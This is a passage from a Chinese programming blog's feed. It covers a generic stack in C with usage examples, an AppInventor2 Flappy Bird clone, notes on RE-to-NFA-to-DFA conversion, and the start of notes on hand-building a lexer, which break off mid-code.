<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// stack.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stack.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></div><div class="line"></div><div class="line">void StackNew(stack *s, int elemSize, void (*freefn)(void *))</div><div class="line">&#123;</div><div class="line">    assert(elemSize &gt; <span class="number">0</span>);</div><div class="line">    s-&gt;elemSize = elemSize;</div><div class="line">    s-&gt;logicalLength = <span class="number">0</span>;</div><div class="line">    s-&gt;allocLength = <span class="number">4</span>;</div><div class="line">    s-&gt;elems = <span class="built_in">malloc</span>(<span class="number">4</span> * elemSize);</div><div class="line">    s-&gt;freefn = freefn;</div><div class="line">    assert(s-&gt;elems != <span class="literal">NULL</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackDispose</span><span class="params">(<span class="built_in">stack</span> *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (s-&gt;freefn != <span class="literal">NULL</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s-&gt;logicalLength; i++)</div><div class="line">        &#123;</div><div class="line">            s-&gt;freefn((<span class="keyword">char</span> *)s-&gt;elems + i * s-&gt;elemSize);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">free</span>(s-&gt;elems);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">StackGrow</span><span class="params">(<span class="built_in">stack</span> *s)</span> <span class="comment">// 供StackPush使用的辅助函数</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    s-&gt;allocLength *= <span class="number">2</span>;</div><div class="line">    s-&gt;elems = <span class="built_in">realloc</span>(s-&gt;elems, s-&gt;allocLength * s-&gt;elemSize);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackPush</span><span class="params">(<span class="built_in">stack</span> *s, <span class="keyword">void</span> *elemAddr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (s-&gt;logicalLength == s-&gt;allocLength)</div><div class="line">    &#123;</div><div class="line">        StackGrow(s);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">void</span> *target = (<span class="keyword">char</span> *)s-&gt;elems + s-&gt;logicalLength * s-&gt;elemSize;</div><div class="line">    <span class="built_in">memcpy</span>(target, elemAddr, s-&gt;elemSize);</div><div class="line">    s-&gt;logicalLength++;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StackPop</span><span class="params">(<span class="built_in">stack</span> *s, <span class="keyword">void</span> *elemAddr)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    assert(s-&gt;logicalLength &gt; <span class="number">0</span>);</div><div class="line">    s-&gt;logicalLength--;</div><div class="line">    <span class="keyword">void</span> *source = (<span class="keyword">char</span> *)s-&gt;elems + s-&gt;logicalLength * s-&gt;elemSize;</div><div class="line">    <span class="built_in">memcpy</span>(elemAddr, source, s-&gt;elemSize);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="用户代码示例"><a href="#用户代码示例" class="headerlink" title="用户代码示例"></a>用户代码示例</h2><ul>
<li><p>String</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stack.h"</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">StringFree</span><span class="params">(<span class="keyword">void</span> *elem)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="built_in">free</span>(*(<span class="keyword">char</span> **)elem);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="built_in">stack</span> stringStack;</div><div class="line">	StackNew(&amp;stringStack, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *), StringFree);</div><div class="line"></div><div class="line">	<span class="keyword">char</span> *a;</div><div class="line">	a = strdup(<span class="string">"aaa"</span>);</div><div class="line">	StackPush(&amp;stringStack, &amp;a);</div><div class="line">	a = strdup(<span class="string">"bbb"</span>);</div><div class="line">	StackPush(&amp;stringStack, &amp;a);</div><div class="line">	a = strdup(<span class="string">"ccc"</span>);</div><div class="line">	StackPush(&amp;stringStack, &amp;a);</div><div class="line">	a = strdup(<span class="string">"ddd"</span>);</div><div class="line">	StackPush(&amp;stringStack, &amp;a);</div><div class="line"></div><div class="line">	<span class="keyword">char</span> *getString;</div><div class="line">	StackPop(&amp;stringStack, &amp;getString);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, getString);</div><div class="line">	<span class="built_in">free</span>(getString);</div><div class="line">	StackPop(&amp;stringStack, &amp;getString);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>, getString);</div><div class="line">	<span class="built_in">free</span>(getString);</div><div class="line"></div><div class="line">	StackDispose(&amp;stringStack);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>  终端输出</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ddd</div><div class="line">ccc</div></pre></td></tr></table></figure>
</li>
<li><p>Int</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stack.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="built_in">stack</span> intStack;</div><div class="line">	StackNew(&amp;intStack, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</div><div class="line">	&#123;</div><div class="line">		StackPush(&amp;intStack, &amp;i);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">int</span> getInt;</div><div class="line">		StackPop(&amp;intStack, &amp;getInt);</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>, getInt);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">putchar</span>(<span class="string">'\n'</span>);</div><div class="line"></div><div class="line">	StackDispose(&amp;intStack);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>  终端输出</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">8 7 6 5</div></pre></td></tr></table></figure>
</li>
</ul>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;都说泛型是C++的一大特性，我大C语言表示不服&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
    
    
      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>AppInventor2复刻FlappyBird</title>
    <link href="http://gaufoo.com/2017/12/08/appinventor/"/>
    <id>http://gaufoo.com/2017/12/08/appinventor/</id>
    <published>2017-12-08T08:13:19.000Z</published>
    <updated>2017-12-09T07:27:57.570Z</updated>
    
    <content type="html"><![CDATA[<p>数字创意设计课程大作业。</p>
<a id="more"></a>
<hr>
<h1 id="画布、图像精灵控件的优点与缺陷"><a href="#画布、图像精灵控件的优点与缺陷" class="headerlink" title="画布、图像精灵控件的优点与缺陷"></a>画布、图像精灵控件的优点与缺陷</h1><ul>
<li>图像精灵只能放在画布内</li>
</ul>
<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ul>
<li>自带与其他图像精灵的碰撞检测</li>
<li>具有自主行为：根据属性值进行移动、旋转</li>
</ul>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul>
<li>精灵的X、Y坐标不能取负值，换句话说，不能从屏幕左端、上端移出屏幕。这给动画实现带来困难。</li>
</ul>
<hr>
<h1 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h1><h2 id="小鸟飞行动画实现"><a href="#小鸟飞行动画实现" class="headerlink" title="小鸟飞行动画实现"></a>小鸟飞行动画实现</h2><p>将小鸟动作分解成一系列的图片，定时按序更换图片。<br><img src="/images/flappybird/bird.png"></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p><img src="/images/flappybird/bird1.png" width="500px"></p>
<hr>
<h2 id="地面移动动画模拟"><a href="#地面移动动画模拟" class="headerlink" title="地面移动动画模拟"></a>地面移动动画模拟</h2><p>地面图像的X坐标定时减少一小步，减少到特定值后跳回去一大步。换句话说，地面的移动轨迹会是 左左左右左左左右左左左右……<br>到这里，画布的缺陷导致需要有一块“幕布”来遮挡最左边的部分。<br><img src="/images/flappybird/moveground1.jpg"></p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p><img src="/images/flappybird/wall.png" width="500px"></p>
<hr>
<h2 id="小鸟控制实现"><a href="#小鸟控制实现" class="headerlink" title="小鸟控制实现"></a>小鸟控制实现</h2><p>表现：</p>
<ul>
<li>游戏开始后，触碰屏幕时，小鸟跳起，头朝上抬起</li>
<li>游戏开始后，不触碰屏幕时，小鸟受重力作用向下坠落，头往下垂</li>
</ul>
<p>实现：</p>
<ul>
<li>角度：点击屏幕，角度设为45度，再定时减少10度</li>
<li>位置：点击屏幕，速度设为负数（如-20），再定时 速度&lt;-加速度+速度，Y坐标&lt;-速度+Y坐标</li>
</ul>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><p><img src="/images/flappybird/clickBird.png" width="500px"></p>
<hr>
<h2 id="柱子数据存储结构"><a href="#柱子数据存储结构" class="headerlink" title="柱子数据存储结构"></a>柱子数据存储结构</h2><p>一共有三组柱子，每组柱子里有上柱子、增分板（下文介绍它的作用）、下柱子。容易想到用二维数组来存储。<br><img src="/images/flappybird/pipes1.jpg"></p>
<p><img src="/images/flappybird/pipeStruct.png" width="500px"></p>
<hr>
<h2 id="无限柱子随机高度生成与移动"><a href="#无限柱子随机高度生成与移动" class="headerlink" title="无限柱子随机高度生成与移动"></a>无限柱子随机高度生成与移动</h2><h3 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h3><p>这里利用图像精灵自带的方向、速度、时间间隔属性，让柱子自己移动。<br><img src="/images/flappybird/pipeproperty.png" width="500px"></p>
<h3 id="随机高度"><a href="#随机高度" class="headerlink" title="随机高度"></a>随机高度</h3><p>屏幕上方放有幕布。生成柱子时，上柱子的Y坐标在幕布高度范围内随机生成，增分板和下柱子依据上柱子的Y坐标计算而得。</p>
<h3 id="无限柱子"><a href="#无限柱子" class="headerlink" title="无限柱子"></a>无限柱子</h3><p>游戏初始化时，每组柱子在屏幕外排好。<br><img src="/images/flappybird/initpipes1.jpg"><br>当每组柱子到达屏幕最左边，让其直接跳到最右边柱子的右边（在屏幕外），用三组柱子模拟无限组柱子。<br><img src="/images/flappybird/movepipes1.jpg"></p>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><p>柱子初始化<br><img src="/images/flappybird/initpipe.png" width="500px"><br>柱子到达最左边后更新<br><img src="/images/flappybird/p1.png" width="500px"><br><img src="/images/flappybird/p2.png" width="500px"><br><img src="/images/flappybird/p3.png" width="500px"></p>
<hr>
<h2 id="柱子与鸟碰撞检测"><a href="#柱子与鸟碰撞检测" class="headerlink" title="柱子与鸟碰撞检测"></a>柱子与鸟碰撞检测</h2><p>这里可以利用图像精灵自带的碰撞检测。另，控件自带碰撞检测是支撑我做这个项目的所有理由。</p>
<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><p>鸟碰到任何一根柱子就GameOver<br><img src="/images/flappybird/birdcopipe.png" width="500px"></p>
<hr>
<h2 id="得分实现策略"><a href="#得分实现策略" class="headerlink" title="得分实现策略"></a>得分实现策略</h2><p>总算要提及奇怪的增分板的作用，其实是供小鸟碰撞，撞到后分数+1</p>
<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><p><img src="/images/flappybird/getscore.png" width="500px"></p>
<hr>
<h2 id="标题显示模块"><a href="#标题显示模块" class="headerlink" title="标题显示模块"></a>标题显示模块</h2><p>选择时机更换标题图片并显示标题<br><img src="/images/flappybird/text_ready.png"><br><img src="/images/flappybird/text_game_over.png"><br><img src="/images/flappybird/title.png" width="500px"></p>
<hr>
<h2 id="分数显示模块"><a href="#分数显示模块" class="headerlink" title="分数显示模块"></a>分数显示模块</h2><p>分数包含10个十进制基数，所以要准备十张图片，分数更新时更新图片。</p>
<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><p><img src="/images/flappybird/score.png" width="500px"></p>
<hr>
<h2 id="分数结算板显示模块"><a href="#分数结算板显示模块" class="headerlink" title="分数结算板显示模块"></a>分数结算板显示模块</h2><p>显示所得分与最高分，最高分显然要用到微数据库，分数显示方法同上</p>
<h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><p><img src="/images/flappybird/panel.png" width="500px"></p>
<hr>
<h1 id="驱动模块"><a href="#驱动模块" class="headerlink" title="驱动模块"></a>驱动模块</h1><h2 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h2><ul>
<li>设置参数</li>
<li>初始化所有图片尺寸</li>
<li>初始化游戏</li>
</ul>
<p><img src="/images/flappybird/main.png" width="500px"></p>
<hr>
<h3 id="初始化所有图片尺寸"><a href="#初始化所有图片尺寸" class="headerlink" title="初始化所有图片尺寸"></a>初始化所有图片尺寸</h3><p><img src="/images/flappybird/initsize.png"></p>
<h4 id="初始化图片尺寸举例"><a href="#初始化图片尺寸举例" class="headerlink" title="初始化图片尺寸举例"></a>初始化图片尺寸举例</h4><p>地面<br><img src="/images/flappybird/initwallsize.png" width="500px"><br>柱子<br><img src="/images/flappybird/initpipesize.png" width="500px"></p>
<hr>
<h3 id="初始化游戏"><a href="#初始化游戏" class="headerlink" title="初始化游戏"></a>初始化游戏</h3><p>未开始游戏时的界面，有“Get Ready”标题。<br><img src="/images/flappybird/initgame.png"></p>
<hr>
<h4 id="初始化所有物件位置"><a href="#初始化所有物件位置" class="headerlink" title="初始化所有物件位置"></a>初始化所有物件位置</h4><p><img src="/images/flappybird/initloc1.png"><br><strong>举例</strong><br>标题<br><img src="/images/flappybird/inittitleloc.png" width="500px"><br>柱子<br><img src="/images/flappybird/initpipeloc.png" width="500px"></p>
<hr>
<h2 id="开始游戏"><a href="#开始游戏" class="headerlink" title="开始游戏"></a>开始游戏</h2><p>当游戏未开始时，触摸屏幕开始游戏。<br><img src="/images/flappybird/startgame.png" width="500px"></p>
<p>开始游戏，标题消失，分数显示，游戏元素启动。<br><img src="/images/flappybird/startgame1.png" width="500px"></p>
<hr>
<h2 id="游戏结束"><a href="#游戏结束" class="headerlink" title="游戏结束"></a>游戏结束</h2><p>当鸟碰到柱子时游戏结束。</p>
<p>定格画面，显示“Game Over”标题，更新最高分，显示分数结算板。<br><img src="/images/flappybird/gameover.png" width="500px"></p>
<hr>
<h1 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h1><p>主要是关于各物件的静止、启动、显示、隐藏。<br><img src="/images/flappybird/thingaux.png" width="500px"></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;数字创意设计课程大作业。&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="http://gaufoo.com/categories/Android/"/>
    
      <category term="AppInventor2" scheme="http://gaufoo.com/categories/Android/AppInventor2/"/>
    
    
      <category term="Android" scheme="http://gaufoo.com/tags/Android/"/>
    
      <category term="AppInventor2" scheme="http://gaufoo.com/tags/AppInventor2/"/>
    
  </entry>
  
  <entry>
    <title>RE转NFA，NFA转DFA</title>
    <link href="http://gaufoo.com/2017/10/29/REtoNFAtoDFA/"/>
    <id>http://gaufoo.com/2017/10/29/REtoNFAtoDFA/</id>
    <published>2017-10-29T12:09:54.000Z</published>
    <updated>2017-10-31T16:06:34.022Z</updated>
    
    <content type="html"><![CDATA[<p>简单笔记</p>
<a id="more"></a>
<hr>
<h2 id="Thompson算法-——-RE-gt-NFA"><a href="#Thompson算法-——-RE-gt-NFA" class="headerlink" title="Thompson算法 —— RE -&gt; NFA"></a>Thompson算法 —— RE -&gt; NFA</h2><h3 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h3><ul>
<li>基本的RE直接构造</li>
<li>复合的RE递归构造</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">e</div><div class="line">  -&gt; eps</div><div class="line">  -&gt; 单个字符c	// 前两种可以直接构造</div><div class="line">  -&gt; e1e2</div><div class="line">  -&gt; e1|e2</div><div class="line">  -&gt; e1*	// 后三种递归构造</div></pre></td></tr></table></figure>
<h3 id="eps"><a href="#eps" class="headerlink" title="eps"></a>eps</h3><p><img src="/images/vrhr/20171029202723.png"></p>
<h3 id="c"><a href="#c" class="headerlink" title="c"></a>c</h3><p><img src="/images/vrhr/20171029202934.png"></p>
<h3 id="e1e2"><a href="#e1e2" class="headerlink" title="e1e2"></a>e1e2</h3><p><img src="/images/vrhr/20171029203142.png"></p>
<h3 id="e1-e2"><a href="#e1-e2" class="headerlink" title="e1|e2"></a>e1|e2</h3><p><img src="/images/vrhr/20171029203543.png"></p>
<h3 id="e1"><a href="#e1" class="headerlink" title="e1*"></a>e1*</h3><p><img src="/images/vrhr/20171029203828.png"></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><blockquote>
<p>a(b|c)*</p>
</blockquote>
<p><img src="/images/vrhr/20171029205037.png"></p>
<hr>
<h2 id="子集构造算法-——-NFA-gt-DFA"><a href="#子集构造算法-——-NFA-gt-DFA" class="headerlink" title="子集构造算法 —— NFA -&gt; DFA"></a>子集构造算法 —— NFA -&gt; DFA</h2><h3 id="基本思想-1"><a href="#基本思想-1" class="headerlink" title="基本思想"></a>基本思想</h3><p><img src="/images/vrhr/20171029205037.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">- 0 	  			 =&gt; 记为q0，添加进Q状态集中，下同</div><div class="line"></div><div class="line">- q0	——a——&gt; 1</div><div class="line">	==a(eps)==&gt; 1 2 3 4 6 *9 =&gt; 记为q1</div><div class="line"></div><div class="line">- q1	——b——&gt; 5				// delta(q1)集合，对每个q1元素的b通路</div><div class="line">	==b(eps)==&gt; 5 8 *9 3 4 6 =&gt; 记为q2	// eps-闭包(eps-closure)</div><div class="line">	——c——&gt; 7</div><div class="line">	==c(eps)==&gt; 7 8 *9 3 4 6 =&gt; 记为q3</div><div class="line">	</div><div class="line">- q2	——c——&gt; 7</div><div class="line">	==c(eps)==&gt; 7 8 9 3 4 6 == q3</div><div class="line">	——b——&gt; 5</div><div class="line">	==b(eps)==&gt; 5 8 9 3 4 6 == q2</div><div class="line"></div><div class="line">- q3	——b——&gt; 5</div><div class="line">	==b(eps)==&gt; 5 8 9 3 4 6 == q2</div><div class="line">	——c——&gt; 7</div><div class="line">	==c(eps)==&gt; 7 8 9 3 4 6 == q3</div></pre></td></tr></table></figure></p>
<p><img src="/images/vrhr/20171029211417.png"></p>
<h3 id="算法伪代码"><a href="#算法伪代码" class="headerlink" title="算法伪代码"></a>算法伪代码</h3><p>由上面的基本思想，容易得到以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">q0 &lt;- eps_closure(n0)</div><div class="line">Q &lt;- &#123;q0&#125;</div><div class="line">workList &lt;- q0</div><div class="line">while (!workList.empty())</div><div class="line">	q &lt;- workList.pop()</div><div class="line">	for each character c	// 256个ASCII码</div><div class="line">		t &lt;- eps_closure(delta(q, c))</div><div class="line">		if (t not in Q)</div><div class="line">			add t to Q</div><div class="line">			add t to workList</div><div class="line">		D[q, c] &lt;- t	// DFA记录此状态转换</div></pre></td></tr></table></figure></p>
<p>eps-闭包的计算：深度优先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">set closure = &#123;&#125;</div><div class="line"></div><div class="line">void eps_closure(x)</div><div class="line">	closure += &#123;x&#125;</div><div class="line">	for each (y| x --eps--&gt; y)</div><div class="line">		if (!visited(y))</div><div class="line">			eps_closure(y)	// 递归</div></pre></td></tr></table></figure></p>
<p>eps-闭包的计算：宽度优先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">set closure = &#123;&#125;</div><div class="line">Q = []		// queue</div><div class="line"></div><div class="line">void eps_closure(x)</div><div class="line">	Q = [x]</div><div class="line">	while (!Q.empty())</div><div class="line">		q &lt;- Q.deQueue()</div><div class="line">		closure += q</div><div class="line">		for each (y| q --eps--&gt; y)</div><div class="line">			if (!visited(y))</div><div class="line">				Q.enQueue(y)</div></pre></td></tr></table></figure></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单笔记&lt;/p&gt;
    
    </summary>
    
      <category term="原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>手工构造词法分析器</title>
    <link href="http://gaufoo.com/2017/10/26/%E6%89%8B%E5%B7%A5%E6%9E%84%E9%80%A0%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E5%99%A8/"/>
    <id>http://gaufoo.com/2017/10/26/手工构造词法分析器/</id>
    <published>2017-10-26T09:36:30.000Z</published>
    <updated>2017-10-30T00:45:51.190Z</updated>
    
    <content type="html"><![CDATA[<p>简单笔记</p>
<a id="more"></a>
<hr>
<h2 id="记号数据结构"><a href="#记号数据结构" class="headerlink" title="记号数据结构"></a>记号数据结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Token的数据结构</span></div><div class="line"><span class="comment">// 将字符流转化成Token流</span></div><div class="line"></div><div class="line"><span class="keyword">enum</span> kind &#123;IF, LPAREN, ID, INTLIT, ...&#125;;</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">token</span> &#123;</span></div><div class="line">	<span class="keyword">enum</span> kind k;</div><div class="line">	<span class="keyword">char</span> lexeme[]; <span class="comment">// 单词</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>例：</p>
<blockquote>
<p>“if (x &gt; 5)”</p>
</blockquote>
<p>=&gt;<br>token {k = IF, lexeme = NULL};<br>// IF 和 “if” 一一对应，没必要记录单词<br>token {k = LPAREN, lexeme = NULL};<br>token {k = ID, lexeme = “x”};<br>…</p>
<hr>
<h2 id="转移图法"><a href="#转移图法" class="headerlink" title="转移图法"></a>转移图法</h2><h3 id="识别比较符"><a href="#识别比较符" class="headerlink" title="识别比较符"></a>识别比较符</h3><h4 id="转移图"><a href="#转移图" class="headerlink" title="转移图"></a>转移图</h4><p><img src="/images/cffx/20171026163706.png"></p>
<h4 id="算法伪代码"><a href="#算法伪代码" class="headerlink" title="算法伪代码"></a>算法伪代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">// 上图的转换算法</div><div class="line"></div><div class="line">token nextToken()</div><div class="line">&#123;</div><div class="line">	c = getChar();</div><div class="line">	switch (c)</div><div class="line">	&#123;</div><div class="line">		case &apos;&lt;&apos;:</div><div class="line">			c = getChar();</div><div class="line">			switch(c)</div><div class="line">			&#123;</div><div class="line">				case &apos;=&apos;: return LE;</div><div class="line">				case &apos;&gt;&apos;: return NE;</div><div class="line">				default: rollback(); return LT;</div><div class="line">			&#125;</div><div class="line">		case &apos;=&apos;: return EQ;</div><div class="line">		case &apos;&gt;&apos;:</div><div class="line">			c = getChar();</div><div class="line">			switch(c)</div><div class="line">			&#123;</div><div class="line">				case &apos;=&apos;: return GE;</div><div class="line">				default: rollback(); return GT;</div><div class="line">			&#125;</div><div class="line">	